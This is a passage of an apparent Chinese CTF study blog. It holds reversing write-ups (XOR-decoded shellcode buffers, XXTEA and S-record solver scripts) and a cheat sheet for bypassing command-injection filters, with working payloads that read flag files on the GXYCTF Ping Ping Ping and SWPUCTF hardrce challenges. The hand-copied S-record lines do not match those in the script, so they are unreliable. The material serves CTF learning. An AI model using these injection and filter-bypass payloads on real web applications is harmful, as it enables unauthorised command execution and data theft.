<span class="number">-27</span>;</span><br><span class="line">  v11[<span class="number">68</span>] = <span class="number">-114</span>;</span><br><span class="line">  v11[<span class="number">69</span>] = <span class="number">103</span>;</span><br><span class="line">  v11[<span class="number">70</span>] = <span class="number">-91</span>;</span><br><span class="line">  lpAddress = <span class="built_in">malloc</span>(<span class="number">0x4Au</span>i64);</span><br><span class="line">  v13 = <span class="built_in">malloc</span>(<span class="number">0x57u</span>i64);</span><br><span class="line">  v14 = <span class="built_in">malloc</span>(<span class="number">0x47u</span>i64);</span><br><span class="line">  <span class="built_in">j_memset</span>(lpAddress, <span class="number">0</span>, <span class="number">0x4Au</span>i64);</span><br><span class="line">  <span class="built_in">j_memset</span>(v13, <span class="number">0</span>, <span class="number">0x57u</span>i64);</span><br><span class="line">  <span class="built_in">j_memset</span>(v14, <span class="number">0</span>, <span class="number">0x47u</span>i64);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)j &lt; <span class="number">0x4A</span>; ++j )</span><br><span class="line">    *((_BYTE *)lpAddress + j) = v7[j] ^ <span class="number">0x5F</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)k &lt; <span class="number">0x57</span>; ++k )</span><br><span class="line">    *((_BYTE *)v13 + k) = v10[k] ^ <span class="number">0x77</span>;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)m &lt; <span class="number">0x47</span>; ++m )</span><br><span class="line">    *((_BYTE *)v14 + m) = v11[m] ^ <span class="number">0x66</span>;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">VirtualProtect</span>(lpAddress, <span class="number">0x1000u</span>i64, <span class="number">0x40u</span>, flOldProtect);</span><br><span class="line">  <span class="built_in">VirtualProtect</span>(v13, <span class="number">0x1000u</span>i64, <span class="number">0x40u</span>, flOldProtect);</span><br><span class="line">  <span class="built_in">VirtualProtect</span>(v14, <span class="number">0x1000u</span>i64, <span class="number">0x40u</span>, flOldProtect);</span><br><span class="line">  qword_140029370 = (__int64 (__fastcall *)(_QWORD))lpAddress;</span><br><span class="line">  qword_140029378 = (__int64 (__fastcall *)(_QWORD))v13;</span><br><span class="line">  result = v14;</span><br><span class="line">  qword_140029380 = (__int64 (__fastcall *)(_QWORD))v14;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>lpAddress = malloc(0x4Aui64); v13 = malloc(0x57ui64); v14 = malloc(0x47ui64);</code> 分配了三块内存区域。</li><li>然后通过三个 <code>for</code> 循环对分配的内存进行异或操作：<ul><li><code>for (j = 0; (unsigned __int64)j &lt; 0x4A; ++j ) *((_BYTE *)lpAddress + j) = v7[j] ^ 0x5F;</code> 对 <code>lpAddress</code> 指向的内存，每个字节与 <code>0x5F</code> 进行异或（可能是一种简单的加密或解密操作，恢复或生成特定数据）。</li><li>同理，对 <code>v13</code> 和 <code>v14</code> 指向的内存分别与 <code>0x77</code>、<code>0x66</code> 进行异或。</li></ul></li></ul><p>如图中标黄部分</p><p>先尝试一下动调</p><p>在关键部分下断点</p><p><img src="/../images/re10.assets/1749864438915-19.png" alt="img"></p><p>随便输入一些字符（随便输入的字符串一定要让长度大于等于0x0C（即12））</p><p>否则会直接跳出</p><p><img src="/../images/re10.assets/1749864438915-20.png" alt="img"></p><p>跟进一下，看到</p><p><img src="/../images/re10.assets/1749864438915-21.png" alt="img"></p><p>有的wp上按C，再按P生成函数，我试了很久都没有成功，换个方法把</p><p>算了，真的不会了</p>]]></content>
      
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week7-web-绕过</title>
      <link href="/2025/05/23/week7-web-%E7%BB%95%E8%BF%87/"/>
      <url>/2025/05/23/week7-web-%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>我们在做题过程中，会有各种各样的过滤限制，我们就可以绕过，具体怎么绕</p><h1 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h1><ul><li>&#x2F;**&#x2F;代替空格</li><li>Tab代替空格</li><li>%a0代替空格</li></ul><p>常见的绕过空格的方法有<code>$IFS$9</code>,<code>$IFS</code>,<code>$IFS$1</code>,<code>$&#123;IFS&#125;</code>,<code>%09</code>,$IFS是linux下的分隔符，加上{}或者后面加$表示截断，防止与后面的变量名粘连导致命令无法执行</p><h1 id="绕过分隔符"><a href="#绕过分隔符" class="headerlink" title="绕过分隔符"></a>绕过分隔符</h1><p>通常有两种表示方法<code>||</code>后者<code>；</code></p><p>都试一下</p><h1 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h1><ul><li>中间加符号</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt; l\s</span><br><span class="line">ls -&gt; l&quot;&quot;s</span><br><span class="line">ls -&gt; l``s</span><br><span class="line">cat /flag -&gt; ca\t /flag -&gt; c\a\t /flag</span><br><span class="line">cat /flag -&gt; ca&quot;&quot;t /flag -&gt; c&quot;&quot;a&quot;&quot;t /flag</span><br><span class="line">cat /flag -&gt; ca``t /flag -&gt; c``a``t /flag</span><br></pre></td></tr></table></figure><ul><li>拆分命令绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt; a=l;b=s;$a$b</span><br><span class="line">cat /flag -&gt; a=ag;b=fl;cat /$b$a;</span><br></pre></td></tr></table></figure><ul><li>编码绕过</li></ul><ol><li><p>base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cat&#x27; | base64  --&gt; Y2F0Cg==</span><br><span class="line">那我们就可以构造cat /flag为：</span><br><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d` /flag</span><br></pre></td></tr></table></figure></li><li><p>hex</p></li></ol><ul><li>通配符绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">？匹配单个字符，若要匹配多个字符，就用多个？连用</span><br><span class="line">* 代表任意数量的字符</span><br><span class="line">[]代表一定有一个在括号内的字符(非任意字符)</span><br></pre></td></tr></table></figure><ul><li>连接符绕过</li></ul><p>利用单引号<code>&#39;&#39;</code>双引号<code>&quot;&quot;</code>反斜杠<code>\</code></p><ul><li>大小写绕过</li></ul><p>直接利用大小写混用，随机搭配，尝试绕过</p><ul><li>引号绕过</li></ul><p>waf拦截时，直接进行替换，单双引号相互替换或者hex十六进制绕过</p><ul><li><p>php限制绕过</p><p>php的限制一般是用于<strong>防止后缀</strong>和<strong>嵌套php文件</strong></p><p>后缀的话一般就用<strong>通配符</strong>就可以绕过了</p></li></ul><h1 id="like绕过"><a href="#like绕过" class="headerlink" title="like绕过"></a>like绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用 like 模糊查询 select user() like ‘%r%’; 模糊查询成功返回 1 否则返回 0 ；</span><br><span class="line">找到第一个字符后继续进行下一个字符匹配，从而找到所有的字符串</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h2><p>打开后是这样的</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523222949319.png" alt="image-20250523222949319"></p><p>依据提示输入</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523223210453.png" alt="image-20250523223210453"></p><p>再次输入</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523223301922.png" alt="image-20250523223301922"></p><p>得到</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523223313826.png" alt="image-20250523223313826"></p><p>继续cat一下</p><p>回显显示过滤了空格</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523223405859.png" alt="image-20250523223405859"></p><p>发现并不是单纯过滤了空格，可能还有flag</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523223549486.png" alt="image-20250523223549486"></p><p>那我们就尝试一下index.php</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523224115787.png" alt="image-20250523224115787"></p><p>下面是回显的内容</p><p>总结一下，空格过滤，大括号过滤，flag四个字母不能同时出现（替换绕过）</p><p>尝试构造 &#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</p><p>因为在前面查看源码时看到了a变量，尝试覆盖a变量</p><p>查看源码</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250523225741796.png" alt="image-20250523225741796"></p><p>出现flag</p><h2 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h2><p>打开环境后</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250524083704376.png" alt="image-20250524083704376"></p><p>看到过滤了一些符号</p><ul><li><p>使用get方式请求给wllm传参</p></li><li><p>使用preg_match函数正则匹配过滤掉了一些符号</p></li></ul><p>​    <code>&#39;\t&#39;,&#39;\r&#39;,&#39;\n&#39;,&#39;\+&#39;,&#39;&#39;,&#39;\&quot;&#39;,&#39;\-&#39;,&#39;\$&#39;,&#39;\*&#39;,&#39;\?&#39;,&#39;\&lt;&#39;,&#39;\&gt;&#39;,&#39;\=&#39;,&#39;\</code>‘&#96;</p><p>​    以及 [a-zA-Z] 即所有的大小写字母</p><p>先构造<code>system(&#39;ls /&#39;)</code></p><p>从上面知道了这道题没有过滤(),所以我们仅对括号内外分别取反再编码</p><p>得到：</p><p><code>%8C%86%8C%8B%9A%92</code></p><p><code>%93%8C%DF%D0</code></p><p>输入<code>?wllm=~(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></p><p>回显<img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250524085245800.png" alt="image-20250524085245800"></p><p>这样我们就<code>cat /flllllaaaaaaggggggg</code></p><p><code>%8C%86%8C%8B%9A%92</code></p><p><code>%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98)</code></p><p>输入<code>?wllm=~(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</code></p><p>回显得到flag</p><p><img src="/../images/week7-web-%E7%BB%95%E8%BF%87.assets/image-20250524085506570.png" alt="image-20250524085506570"></p><p><code>NSSCTF&#123;a912912e-6079-4e98-8817-8264ffdc612a&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week7-re-ISCC</title>
      <link href="/2025/05/19/week7-re-ISCC/"/>
      <url>/2025/05/19/week7-re-ISCC/</url>
      
        <content type="html"><![CDATA[<h1 id="something"><a href="#something" class="headerlink" title="something"></a>something</h1><p>先die查壳<img src="/../images/week7-re-ISCC.assets/image-20250519185255315.png" alt="image-20250519185255315"></p><p>用ida打开后，直接进入main函数，看到与pyinstaller有关，利用python反编译一下（需要在同一目录下）</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519190431141.png" alt="image-20250519190431141"></p><p><img src="/../images/week7-re-ISCC.assets/image-20250519191136040.png" alt="image-20250519191136040"></p><p>这个题不会啊</p><h1 id="冗余的代码"><a href="#冗余的代码" class="headerlink" title="冗余的代码"></a>冗余的代码</h1><p>依旧是先查壳</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519191930506.png" alt="image-20250519191930506"></p><p>拖进ida</p><p>shift+f12看一下 关键字，看到下面的部分，猜测可能是与flag有关，跟进看看</p><p><img src="/../images/week7-re-ISCC.assets/image-20250521194304806.png" alt="image-20250521194304806"></p><p><img src="/../images/week7-re-ISCC.assets/image-20250519192305874.png" alt="image-20250519192305874"></p><p>看到爆红的部分，可能是花指令，去除一下，nop掉，按C编译</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519192407687.png" alt="image-20250519192407687"></p><p>一个接着一个，本来想数一下的，但是太多了，没数过来，我们把他们全部nop掉就行了</p><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>重新看一下关键字，依旧是刚才那个地方 跟进一下，看到那个部分的函数，试一下动调</p><p>目前没有成功</p><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>看wp中写的，直接利用idapython一把梭，先把代码放上，再看看逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xxtea_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mx</span>():</span><br><span class="line">        <span class="keyword">return</span> (((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>)) ^ ((sum_ ^ y) + (key[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line">    n = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    sum_ = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    z = data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        sum_ = (sum_ + delta) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        e = (sum_ &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            y = data[(p + <span class="number">1</span>) % n]</span><br><span class="line">            z = data[p] = (data[p] + mx()) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_key_from_exe</span>(<span class="params">file_path, offset=<span class="number">0x30e20</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.seek(offset)</span><br><span class="line">        key_bytes = f.read(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_bytes) != <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;读取 key 失败，长度不足 16 字节&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key_bytes))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    exe_path = <span class="string">&quot;冗余的代码.exe&quot;</span>  <span class="comment"># 替换为实际路径</span></span><br><span class="line">    v = [<span class="number">33686020</span>, <span class="number">67174660</span>, <span class="number">67240450</span>]</span><br><span class="line">    xor_key = [<span class="number">0x0d</span>, <span class="number">0x0c</span>, <span class="number">0x0b</span>, <span class="number">0x0a</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x0f</span>, <span class="number">0x0e</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>]</span><br><span class="line">    key = read_key_from_exe(exe_path)</span><br><span class="line"></span><br><span class="line">    encrypted = xxtea_encrypt(v.copy(), key)</span><br><span class="line">    encrypted_bytes = <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, x) <span class="keyword">for</span> x <span class="keyword">in</span> encrypted)</span><br><span class="line">    xor_result = <span class="built_in">bytes</span>(b ^ xor_key[i] <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_bytes))</span><br><span class="line">    final = struct.unpack(<span class="string">&#x27;&lt;III&#x27;</span>, xor_result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> final:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;num:08x&#125;</span>&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这段代码涉及XXTEA，结合xor异或操作，最终生成字符串（也就是flag）</p><ul><li>从这个文件中读取16字节密钥</li><li>使用 <strong>XXTEA 算法</strong> 加密给定的整数数组 <code>v = [33686020, 67174660, 67240450]</code></li><li>对加密后的数据再进行 <em>逐字节 XOR 操作</em></li><li>将结果转换为十六进制格式，拼接成 <code>ISCC&#123;...&#125;</code> 形式的字符串。</li></ul><p>运行后直接得到flag</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519195554481.png" alt="image-20250519195554481"></p><h1 id="faze"><a href="#faze" class="headerlink" title="faze"></a>faze</h1><p>依旧是先查壳</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519195814712.png" alt="image-20250519195814712"></p><p>拖进ida中，直接查看一下关键字</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519195853079.png" alt="image-20250519195853079"></p><p>我们发现这个flag是自己输入的，我们可以用动调解决类似题目，我们先跟进这段，进入这段代码</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519200037057.png" alt="image-20250519200037057"></p><p>我们在correct这里和incorrect都下一个断点</p><p>随便输入flag后我们就直接得到了flag</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519200436164.png" alt="image-20250519200436164"></p><p><em>ISCC{(O[&amp;TR\7@ye@}</em></p><h1 id="SecretGird"><a href="#SecretGird" class="headerlink" title="SecretGird"></a>SecretGird</h1><p>依旧是先查壳</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519201112691.png" alt="image-20250519201112691"></p><p>拖进ida中</p><p>我想调试一下，出现下面的问题</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519201642830.png" alt="image-20250519201642830"></p><p>出现和wp中一样的问题</p><p>解决好后重新来一遍</p><p>我们看到main函数中</p><p>调用 <code>checklist1()</code> 判断输入格式是否合格。</p><ul><li>不合格直接提示“Invalid format”。</li></ul><p>如果合格，则调用 <code>checklist2()</code> 评分。</p><ul><li>如果得分 &gt; 4，显示鼓励信息并显示 flag。</li><li>否则提示失败。</li></ul><p>看一下这两段函数的具体内容</p><p><img src="/../images/week7-re-ISCC.assets/image-20250519205524627.png" alt="image-20250519205524627"></p><p><img src="/../images/week7-re-ISCC.assets/image-20250519205527607.png" alt="image-20250519205527607"></p><p>calist中 是数独填写内容</p><p>我们看一下printflag函数</p><p><img src="/../images/week7-re-ISCC.assets/image-20250520194519722.png" alt="image-20250520194519722"></p><p>里面有密文</p><p><img src="/../images/week7-re-ISCC.assets/image-20250520194822987.png" alt="image-20250520194822987"></p><p><img src="/../images/week7-re-ISCC.assets/image-20250520194828931.png" alt="image-20250520194828931"></p><p>提取解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v2[0] =&quot;S12305C9421FFD093E1002C7C3F0B78907F000C909F00083920000913F001E4800012C7E&quot;;</span><br><span class="line">v2[1] =&quot;S123052C813F001E552907FE2F890000409E058813F001E815F000C7D2A4A1489290000FF&quot;;</span><br><span class="line">v2[2] =&quot;S123054C7D2A07743D2100821098013F001E7D284A1489290003920005529263EC7F&quot;;</span><br><span class="line">v2[3] =&quot;S123056C7D294077D494A78D274813F001E815F000C7D2A4A1559A063E99490000074&quot;;</span><br><span class="line">v2[4] =&quot;S123058C480800BC815F001ED205556512955567D0A48967D49FE707D2940501D2900317&quot;;</span><br><span class="line">v2[5] =&quot;S12305AC7D295052F890000409E058813F001E815F000C7D2A4A14892900007D2A0A7476&quot;;</span><br><span class="line">v2[6] =&quot;S12305CC3D2100281098013F001E7D284A148929000039200055292067D297043F&quot;;</span><br><span class="line">v2[7] =&quot;S12305EC7D494A787D287D4813F001E815F000C7D2A4A1455A063E994900000D2&quot;;</span><br><span class="line">v2[8] =&quot;S123060C813F001E815F000C7D2A4A1489902003D210028149018813F001E7D2A4A145A&quot;;</span><br><span class="line">v2[9] =&quot;S123062C8949000813F001E80FF0003D274A147D0A527855A063E9949000813F001E0EA1&quot;;</span><br><span class="line">v2[10] =&quot;S123064C329900013F001E4809DFED0831F0083929001F394000040&quot;;</span><br><span class="line">v2[11] =&quot;S11B066C99490006000000397F00383EBFFFC7D615B784E80002060&quot;;</span><br></pre></td></tr></table></figure><p>这里就直接使用wp中的脚本了····</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># Motorola S-record数据</span></span><br><span class="line">s_records = [</span><br><span class="line">    <span class="string">&quot;S123050C9421FFD093E1002C7C3F0B78907F000C909F000839200000913F001E4800012C7E&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S123052C813F001E552907FE2F890000409E0058813F001E815F000C7D2A4A1489290000FF&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S123054C7D2A07743D20100281090018813F001E7D284A1489290000392900025529063EC7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S123056C7D2907747D494A787D280774813F001E815F00087D2A4A14550A063E9949000074&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S123058C480000BC815F001E3D205555612955567D0A48967D49FE707D2940501D29000317&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S12305AC7D2950502F890000409E0058813F001E815F000C7D2A4A14892900007D2A077476&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S12305CC3D20100281090018813F001E7D284A1489290000392900055529063E7D2907743F&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S12305EC7D494A787D280774813F001E815F00087D2A4A14550A063E99490000480000408D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S123060C813F001E815F000C7D2A4A14890900003D20100281490018813F001E7D2A4A145A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S123062C89490000813F001E80FF00087D274A147D0A5278554A063E99490000813F001EA1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S123064C39290001913F001E813F001E2F89001E409DFED0813F00083929001F3940000040&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S11B066C9949000060000000397F003083EBFFFC7D615B784E80002060&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_s_record</span>(<span class="params">srec</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析Motorola S-record，返回地址和字节数据&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> srec.startswith(<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    record_type = srec[<span class="number">1</span>]</span><br><span class="line">    length = <span class="built_in">int</span>(srec[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>) - <span class="number">3</span>  <span class="comment"># 减去地址和校验和占用的字节</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> record_type == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="comment"># S1记录：16位地址</span></span><br><span class="line">        address = <span class="built_in">int</span>(srec[<span class="number">4</span>:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">        data = srec[<span class="number">8</span>:-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> record_type == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="comment"># S2记录：24位地址</span></span><br><span class="line">        address = <span class="built_in">int</span>(srec[<span class="number">4</span>:<span class="number">10</span>], <span class="number">16</span>)</span><br><span class="line">        data = srec[<span class="number">10</span>:-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> record_type == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        <span class="comment"># S3记录：32位地址</span></span><br><span class="line">        address = <span class="built_in">int</span>(srec[<span class="number">4</span>:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">        data = srec[<span class="number">12</span>:-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span 